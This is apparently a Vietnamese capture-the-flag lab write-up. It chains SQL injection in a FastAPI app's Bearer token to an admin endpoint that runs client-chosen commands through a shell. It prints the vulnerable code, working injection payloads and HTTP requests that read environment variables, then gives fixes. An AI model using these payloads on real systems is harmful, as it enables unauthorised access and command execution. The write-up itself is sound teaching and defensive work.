+++
title = "PromptRelay — SQL Injection to RCE via Admin Tools"
date = 2026-11-02T00:00:00+07:00
draft = false
tags = ["Web", "SQL Injection", "RCE", "FastAPI", "SQLite", "Burp Suite"]
categories = ["Writeups"]
summary = "Lab 413: SQL Injection trong Bearer token cho phép lấy quyền admin:tools, rồi dùng chức năng test connection để thực thi lệnh và đọc flag từ biến môi trường."
ShowToc = true
TocOpen = false
+++

PromptRelay là lab FastAPI sử dụng API key để xác thực và phân quyền. Chuỗi khai thác bắt đầu từ Bearer token bị nối trực tiếp vào SQL. Khi chọn được bản ghi mang quyền `admin:tools`, mình có thể gọi chức năng kiểm tra kết nối của custom tool và chạy lệnh trên server.

## Reconnaissance

Trang public và tài liệu OpenAPI cho thấy các endpoint đáng chú ý:

```http
GET /api/v1/models
GET /api/v1/admin/tools/servers
POST /api/v1/admin/tools/test-connection
```

API Docs mô tả các quyền gắn với API key, trong đó các chức năng admin yêu cầu scope như `admin:tools` hoặc `admin:config`. JavaScript của trang admin còn cho thấy request kiểm tra kết nối custom tool nhận hai trường `command` và `args` từ client.

Ban đầu, gửi token không hợp lệ tới `/api/v1/models` nhận `401 Unauthorized` với thông báo `Invalid API key.`:

![Request dùng token không hợp lệ bị từ chối](/images/imported/promptrelay/image1.png)

## Root Cause 1 — SQL Injection tại Bearer token

### Code xác thực có lỗ hổng

Backend tách token từ header `Authorization`, tìm bản ghi tương ứng trong bảng `api_keys`, rồi dùng quyền của bản ghi đó để kiểm tra truy cập. Đoạn code trong tài liệu cho thấy token được chèn thẳng vào câu SQL:

```python
def verify_bearer_token(authorization: str):
    if not authorization or not authorization.startswith("Bearer "):
        return None

    token = authorization[7:]
    conn = get_db()
    cursor = conn.cursor()
    query = (
        "SELECT id, token, owner, permissions, is_active "
        f"FROM api_keys WHERE token = '{token}'"
    )

    try:
        cursor.execute(query)
        row = cursor.fetchone()
    except Exception:
        conn.close()
        return None

    # ... phần xử lý bản ghi và quyền ...
```

Vấn đề nằm ở f-string chứa `{token}`: dữ liệu từ header có thể thay đổi cú pháp truy vấn thay vì chỉ được so sánh với cột `token`.

### Bypass xác thực

Thay Bearer token bằng payload:

```http
Authorization: Bearer ' OR 1=1--
```

Điều kiện `WHERE` trở thành luôn đúng, còn dấu `--` vô hiệu hóa dấu nháy đóng phía sau. Request tới `/api/v1/models` lúc này trả `200 OK` cùng danh sách model:

![SQL Injection trong Bearer token trả về danh sách model](/images/imported/promptrelay/image2.png)

Tuy nhiên, bypass xác thực chưa bảo đảm bản ghi đầu tiên có quyền admin. Để nhắm tới quyền cần dùng, đổi payload thành:

```http
Authorization: Bearer ' OR permissions LIKE '%admin:tools%'--
```

Query sau khi ghép có dạng:

```sql
SELECT id, token, owner, permissions, is_active
FROM api_keys
WHERE token = '' OR permissions LIKE '%admin:tools%'--'
```

Scope `admin:tools` xuất hiện trong API Docs; tên cột `permissions` được đối chiếu với đoạn source và request thành công. `fetchone()` lấy bản ghi khớp điều kiện đã bị sửa, khiến request được xử lý với quyền của API key đó mà không cần biết token thật.

Gửi payload này tới `/api/v1/admin/tools/servers` nhận danh sách tool servers:

![Payload chọn quyền admin:tools truy cập được danh sách tool servers](/images/imported/promptrelay/image3.png)

Trong danh sách có **Code Interpreter**, loại `custom`, với endpoint `/usr/local/bin/code-runner`. Các tool còn lại gồm Web Search, Document Retrieval và Image Generator.

## Root Cause 2 — Thực thi lệnh từ dữ liệu của client

### Code xử lý custom tool có lỗ hổng

Endpoint kiểm tra kết nối lấy `command` và `args` từ JSON, ghép thành một chuỗi rồi chuyển cho shell:

```python
@app.post("/api/v1/admin/tools/test-connection")
async def admin_test_connection(request: Request):
    # ... đọc body, server_type và kiểm tra xác thực/phân quyền ...
    if server_type == "custom":
        command = body.get("command", "")
        args = body.get("args", [])
        full_cmd = f"{command} {' '.join(str(a) for a in args)}".strip()
        result = subprocess.run(
            full_cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=10,
        )
```

Có hai vấn đề ở đây: caller được chọn chương trình cần chạy, và `shell=True` khiến shell diễn giải cả chuỗi ghép từ input. Vì vậy, ngoài việc gọi executable tùy ý, các ký tự đặc biệt trong đối số còn có thể trở thành cú pháp shell. `timeout=10` chỉ giới hạn thời gian chạy.

### Từ Admin Tools đến RCE

Giữ header SQLi chọn quyền `admin:tools` và gửi request kiểm tra đơn giản:

```http
POST /api/v1/admin/tools/test-connection HTTP/1.1
Authorization: Bearer ' OR permissions LIKE '%admin:tools%'--
Content-Type: application/json

{
  "server_type": "custom",
  "command": "/bin/echo",
  "args": ["hello"]
}
```

Endpoint trả kết quả chạy lệnh qua các trường như `output` và `error_output`. Để đọc biến môi trường của tiến trình trong lab, thay body bằng:

```json
{
  "server_type": "custom",
  "command": "/usr/bin/env",
  "args": []
}
```

Ảnh response cho thấy `status: "success"`, `return_code: 0` và biến `FLAG` nằm trong `output`:

![Lệnh env trả biến môi trường chứa FLAG](/images/imported/promptrelay/image4.png)

Payload này tận dụng trực tiếp khả năng chọn executable, chưa cần chèn ký tự shell. SQL Injection ở lớp xác thực đã đưa client không có API key hợp lệ tới chức năng thực thi lệnh của admin.

## Khắc phục

### Dùng truy vấn tham số hóa

Thay phần ghép token vào SQL bằng placeholder của SQLite:

```python
cursor.execute(
    "SELECT id, token, owner, permissions, is_active "
    "FROM api_keys WHERE token = ?",
    (token,),
)
row = cursor.fetchone()
```

Token được xử lý như dữ liệu, kể cả khi chứa dấu nháy, `OR` hoặc comment SQL. Sau khi tra cứu vẫn cần kiểm tra trạng thái `is_active` và quyền của API key trước khi cho truy cập endpoint.

### Giới hạn executable và bỏ shell

Phần thực thi custom tool có thể đổi theo hướng sau. Đây là đoạn minh họa phần gọi process; các bước xác thực và kiểm tra body vẫn cần được thực hiện trước đó:

```python
ALLOWED_COMMANDS = {
    "/usr/local/bin/tool-server",
    "/usr/local/bin/mcp-check",
}

command = body.get("command", "")
args = body.get("args", [])

if not isinstance(command, str) or command not in ALLOWED_COMMANDS:
    return JSONResponse(
        {"error": "Command not in allowlist"}, status_code=400
    )

if not isinstance(args, list) or not all(isinstance(a, str) for a in args):
    return JSONResponse({"error": "Invalid args"}, status_code=400)

# Kiểm tra các đối số được phép cho từng executable trước khi chạy.
result = subprocess.run(
    [command, *args],
    shell=False,
    capture_output=True,
    text=True,
    timeout=10,
)
```

Allowlist giới hạn chương trình được gọi; truyền danh sách đối số với `shell=False` tránh việc shell diễn giải input. Vẫn phải kiểm tra các tùy chọn của từng executable, vì chương trình được phép chạy có thể tự hỗ trợ thao tác nguy hiểm. Tool cũng cần chạy trong sandbox hoặc container riêng, dưới tài khoản ít quyền và có giới hạn tài nguyên.

Trong PromptRelay, lỗi nối token vào SQL làm mất ranh giới xác thực; custom tool cho phép chọn lệnh biến quyền admin lấy được thành RCE. Cần sửa cả hai mắt xích để đóng chuỗi khai thác này.
